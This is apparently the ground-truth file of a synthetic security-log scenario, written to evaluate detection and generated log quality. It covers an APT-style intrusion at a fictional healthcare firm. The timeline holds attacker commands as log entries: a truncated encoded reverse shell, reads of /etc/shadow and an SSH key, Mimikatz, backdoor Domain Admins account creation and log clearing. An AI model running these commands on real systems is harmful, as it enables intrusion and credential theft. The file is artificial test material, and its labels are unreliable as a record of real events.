# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:12:17 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:17:43 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CX54ItO0hUgddbaSbw) |
| 2024-03-18 12:23:58 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:25 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:25 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:31:17 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (384 requests) |
| 2024-03-18 12:45:03 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:48:00 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:52:53 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: C8b3FtYDPIJ794DjtLW) |
| 2024-03-18 12:59:49 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CArHKJcRlS83qY2bLE) |
| 2024-03-18 12:59:49 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: C1GwDJNo8eHHAEvaZ) |
| 2024-03-18 13:20:30 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CXkly27XMEUk6y2oHja) |
| 2024-03-18 13:20:32 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581497) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:20:33 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CLfHpnmrjGNXZmSuRMR) |
| 2024-03-18 13:20:35 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:31 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584249) - `ip addr show` |
| 2024-03-18 13:39:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584288) - `cat /etc/hosts` |
| 2024-03-18 13:39:50 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584681) - `cat /etc/resolv.conf` |
| 2024-03-18 13:42:36 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 584776) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:43:16 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584849) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:43:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 584875) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:50:02 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:31 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:33 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587078) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587100) - `ls -la /root/.ssh` |
| 2024-03-18 13:59:46 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587229) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:15:02 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: CpgA1tT5kkWbOAKBQ) |
| 2024-03-18 14:15:15 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: Cy02yCZwpORihtTX6k) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:34:45 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962118) - `cat /etc/passwd` |
| 2024-03-18 14:34:49 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962142) - `cat /etc/shadow` |
| 2024-03-18 14:50:28 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:59:16 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:36 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:37 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: CDCUiHs9GDiSFQPr1F) |
| 2024-03-18 15:07:50 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:14:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: C501dEkCMEKPicqjE3) |
| 2024-03-18 15:19:32 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x26ffa0f) |
| 2024-03-18 15:19:34 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 7376) - `whoami /all` |
| 2024-03-18 15:19:35 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7380) - `net user /domain` |
| 2024-03-18 15:19:36 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7384) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:19:43 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7392) - `net view /domain` |
| 2024-03-18 15:19:45 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:19:46 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: Cvm8JAuiDCkmwPGMo) |
| 2024-03-18 15:44:44 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 7404) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:44 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 15:44:52 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 16:00:23 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x5554f72) |
| 2024-03-18 16:00:27 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:29 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5396) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:31 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5400) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:30 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:48 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5424) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:50 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:52 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:14:52 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5460) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:19:57 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5480) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:19:58 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5504) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:19:58 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:00 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:55 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:24 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:45:21 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 258 queries, 1345 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=257 emitted=6 filtered=251] |
| 2024-03-18 16:50:11 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 16:59:51 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=182 emitted=18 filtered=164] |
| 2024-03-18 17:00:34 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf8842ea) |
| 2024-03-18 17:00:35 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5768) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:00:36 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5772) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:44 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: C3pYm5i1AOOFxYTh2g) |
| 2024-03-18 17:14:47 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158477) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:12 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 158822) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:11 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 158991) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:25:11 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CIbHZiwoarQuuWTqQy) |
| 2024-03-18 17:30:07 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:35:18 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:40:29 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608826) - `shred -u /root/.bash_history` |
| 2024-03-18 17:40:45 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982831) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:41:45 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5772) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:41:47 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 5784) - `wevtutil cl Security` |
| 2024-03-18 17:41:48 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:45:24 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:32 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:45:35 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:09 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5812) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:16 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:40 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:55:37 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:35 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 0067137a-c9fe-4114-9892-8572e33ba5df | ids | visible: 1 |
| 03090e97-8571-45a6-8e67-2dac17560776 | ids | filtered: 1 |
| 0347de7c-90f1-4c41-bbbd-b3eb3e60f693 | ids | delayed: 1 |
| 03fd9869-e7b5-460f-954b-ad8e17e46e98 | ids | delayed: 2 |
| 054a7000-e1ed-4e4e-9a35-160c0b639c1b | ids | delayed: 1 |
| 0609883d-9d93-4baf-b31b-a466dfb5a2bf | ids | delayed: 1 |
| 0b2a01d8-fb6f-431b-b824-2b93b3bfdf6e | ids | delayed: 1 |
| 0cb0e0f0-26d6-461a-bf36-de6824f118e9 | ids | delayed: 2 |
| 0cf7b6f2-afad-498a-b5d0-94c7c10f9f34 | ids | delayed: 1 |
| 0fb672d2-9fbe-45d8-af1c-fc0bce8897f4 | ids | delayed: 1 |
| 12173f2a-ebce-456d-b27a-b91dee0558d3 | ids | delayed: 2 |
| 16bad131-51ac-4897-bba8-243b14b41875 | ids | delayed: 1 |
| 177fb28e-3dc5-4022-b874-93a363f8929c | ids | delayed: 1 |
| 17c13056-be44-4c71-a634-f348bbf870f0 | ids | delayed: 1 |
| 1903181b-a59d-4708-ac43-be473b653077 | ids | delayed: 1 |
| 1dff6739-22a5-41a9-a57f-7bdbf94c7347 | ids | delayed: 1 |
| 22f617ae-e95a-4646-b08f-516ad2a2fba1 | ids | delayed: 1 |
| 241c0e1c-d6c5-4184-a93c-196a0f40b4a5 | ids | delayed: 1 |
| 26dbad5e-072a-44e6-bbb3-eddd5f38da39 | ids | delayed: 1 |
| 2bdba0ef-7906-453b-8468-d65a68f4325c | ids | delayed: 1 |
| 2d1555fd-6d4d-45ce-a2ea-7d28c5aa15ce | ids | delayed: 1 |
| 302305a4-4eea-4411-ba7a-f83dea1945df | ids | delayed: 2 |
| 32c70e78-4cf2-405c-beb4-88f0f22e9ec2 | ids | delayed: 1 |
| 35654bfa-3b24-4d2b-be96-8442db6c2064 | ids | delayed: 1 |
| 369d5ed3-07b6-49f4-828f-b75a13ab19c5 | ids | delayed: 2 |
| 36fa3b3e-dfee-46f8-aa19-69c28d406d2e | ids | delayed: 1 |
| 378b3a75-0b1d-4c29-9c20-fbbe74173fef | ids | delayed: 1 |
| 37a6d1d6-7e7c-479b-aba7-21559f3c7387 | ids | delayed: 1 |
| 38a9ffe4-9167-4de5-83f8-9ae7e47b3a5a | ids | delayed: 1 |
| 38f36563-eb6f-4f93-8130-d816c6ac7150 | ids | delayed: 1 |
| 3ae07338-1c74-4399-87e5-932ecc64becf | ids | delayed: 1 |
| 3b535e0f-3206-4c19-9268-16af3a092da9 | ids | delayed: 1 |
| 3ce421ed-f253-4047-bd79-00092a4a2b83 | ids | delayed: 2 |
| 41254918-dc96-4390-8a42-83c5ebbaac40 | ids | delayed: 1 |
| 41a63de6-0fe8-4f94-9343-581305dfd3d5 | ids | delayed: 1 |
| 4265d8d4-4b8b-4b18-b4f9-20d8ee4c8980 | ids | delayed: 1 |
| 42fb081b-919a-4723-be94-3f720519e49e | ids | delayed: 2 |
| 4356f99a-d5ba-4b24-9ebc-5c1794a762fc | ids | delayed: 2 |
| 44450b5b-7c35-43e1-b181-0373be69337b | ids | delayed: 1 |
| 462e5224-3240-46ff-9782-03fc0f8b5492 | ids | delayed: 1 |
| 46c9ffde-47f5-4c4f-a9f4-4b7f4fa34709 | ids | delayed: 1 |
| 480d401c-1250-458b-8c93-8cf8f835128e | ids | delayed: 1 |
| 4983cfb6-f170-40a6-8d4d-8a5fa6be7980 | ids | delayed: 1 |
| 4a35a72d-7d5e-484b-b9d8-465ec00191f1 | ids | delayed: 1 |
| 4b61b83e-c8ec-4b47-9b06-8c6349cc3387 | ids | delayed: 2 |
| 4c04be67-2f1c-4df0-8a29-5f1499aa5e9d | ids | delayed: 1 |
| 4dba99a8-9eab-467b-98e1-997a88ef74fa | ids | delayed: 1 |
| 5071cf9e-0990-4666-a672-6f07b48140fb | ids | delayed: 1 |
| 543af8fd-e79e-494b-be57-d51827517a72 | ids | delayed: 1 |
| 54a03057-7cb2-4bab-9b32-51814fd67062 | ids | delayed: 2 |
| 57250898-0310-4aea-97cf-c4ce2bb107b7 | ids | delayed: 2 |
| 58c56701-a909-494e-ba19-ec8302955110 | ids | delayed: 1 |
| 61948c60-e62d-4011-befa-4537635af517 | ids | delayed: 2 |
| 61d1d4f3-1a4f-4d4d-9bc1-5fbbed9f2edf | ids | delayed: 2 |
| 645e5820-1d18-4546-8df3-908c342e5a2f | ids | delayed: 1 |
| 66bde74b-a0cb-4eef-9a5f-1213dd59aef8 | ids | delayed: 2 |
| 67b87291-ed31-4058-bfa4-3db622ff4523 | ids | delayed: 1 |
| 67b9546b-577f-4831-8dc0-87f6fd1af4e7 | ids | delayed: 2 |
| 6894b77a-77e6-4322-bf32-3ce626a04183 | ids | delayed: 1 |
| 6c023a97-82c8-4bd6-8c6b-5c32ecaae028 | ids | delayed: 1 |
| 6c56631a-9055-4aab-aae7-b85f542c9446 | ids | delayed: 1 |
| 6d73ca89-ae06-4c51-9c97-2c37484f1c94 | ids | delayed: 1 |
| 6f328a73-612a-4b3f-898f-c829efb9e7c4 | ids | visible: 1 |
| 6f962f16-375d-4ff5-9195-5bfbbf4c2c4d | ids | delayed: 1 |
| 7078dacf-bc02-43ec-9d5f-bdb29bd8fe0a | ids | delayed: 1 |
| 73678130-39c4-464d-8df6-b7d845cbe8f5 | ids | delayed: 1 |
| 771bc98c-d961-435f-bf84-c86c1f544e49 | ids | delayed: 1 |
| 78ed7f43-7fc4-4ede-9a03-f7c70c24189b | ids | delayed: 2 |
| 7bc06a76-9719-46a0-b45a-c7849a3ddb2c | ids | delayed: 1 |
| 80847a5a-b596-450b-9fb7-8808066384e3 | ids | delayed: 1 |
| 812f5e3a-6202-4bce-acd6-8bebca0b7baa | ids | delayed: 1 |
| 84c1156a-b929-4213-a2ca-12bb032770be | ids | delayed: 1 |
| 8b2f0c0f-ed11-4a4a-911e-430a419024e5 | ids | delayed: 1 |
| 8db02f03-1165-4790-aa24-8a4297fc81a8 | ids | delayed: 1 |
| 8f2729de-1b64-4346-8d99-4be76915fad6 | ids | delayed: 1 |
| 936115ad-ea66-4b6c-8064-d3b5a1c6328e | ids | delayed: 1 |
| 9d0f4ddb-9488-4d84-87fb-1fd613df2f4b | ids | delayed: 1 |
| 9d9fe6cc-38cc-48e2-a60b-43855cf9312b | ids | delayed: 1 |
| 9f4dec51-5f5f-4380-91c6-380d291b4a0a | ids | delayed: 1 |
| a059b55c-9552-4faf-844d-ead352702f34 | ids | delayed: 1 |
| a38758d3-a0fc-49d8-bfcf-a204a0ff6387 | ids | delayed: 1 |
| a4bb7c07-2aa1-47e6-849b-d91bf5ed9990 | ids | delayed: 1 |
| a5fee3d1-9942-4082-9ad3-a7dc2be11f5f | ids | delayed: 1 |
| a7870452-04ee-440b-afd4-2b34c6cd33e4 | ids | delayed: 1 |
| ab3d4552-dfd7-43d9-b580-96f4345e0f3e | ids | delayed: 2 |
| ad76fa75-699b-4c3c-965d-bda87a5cb896 | ids | delayed: 1 |
| b077f242-c373-406a-b646-5e82f3979624 | ids | delayed: 2 |
| b08ab1ef-7c5a-478a-a335-1d3926ccb574 | ids | delayed: 1 |
| b14d3b5d-c11d-4010-a92f-e09230878e4f | ids | delayed: 1 |
| b3e278f9-ce37-4536-96ee-317c5e943d5b | ids | visible: 1 |
| b4db5b92-2ee9-4fb7-aa76-a636ef5f1409 | ids | delayed: 1 |
| bc93c94c-1515-4e4f-b951-5d16c723d2e8 | ids | delayed: 1 |
| be2ae226-84b5-42c1-9915-11a75895c004 | ids | delayed: 2 |
| c3455362-c8ec-46c9-a12d-e710d051a827 | ids | delayed: 1 |
| c4743218-3b60-4d47-9bbb-25bfdd23e662 | ids | delayed: 1 |
| c7214b00-cc07-492d-a688-2de2469f8d39 | ids | delayed: 1 |
| c83f944d-2c03-48f8-bc90-0e5289f399fa | ids | delayed: 1 |
| cbf0739e-5630-43e3-8f1a-2510cb4727c6 | ids | delayed: 1 |
| cc8dddd5-17e5-4d16-b0ab-2807e50437df | ids | delayed: 1 |
| ccda4271-4464-470f-bd72-5b3992a1073f | ids | delayed: 1 |
| d0fbe78a-ee5b-4f05-b09d-ab7cf2c9b454 | ids | delayed: 1 |
| d1fd96ac-d191-4bd5-a518-5f3d4bf08bb8 | ids | delayed: 1 |
| d5b846b4-b5f0-4793-82d6-7f2c3190e5fd | ids | delayed: 2 |
| d934c186-75d6-41a7-bb4a-22a3bd43e5e6 | ids | delayed: 1 |
| daf3f73c-45ce-47e0-bf54-9c7d7c1467f7 | ids | delayed: 1 |
| dc2ff62c-960b-4743-b3f3-291803751cae | ids | delayed: 1 |
| dcd29910-2f36-4d6c-b54b-122a319f6b04 | ids | delayed: 1 |
| dda95b16-92b0-4c6a-b4ab-fbff556f850c | ids | delayed: 1 |
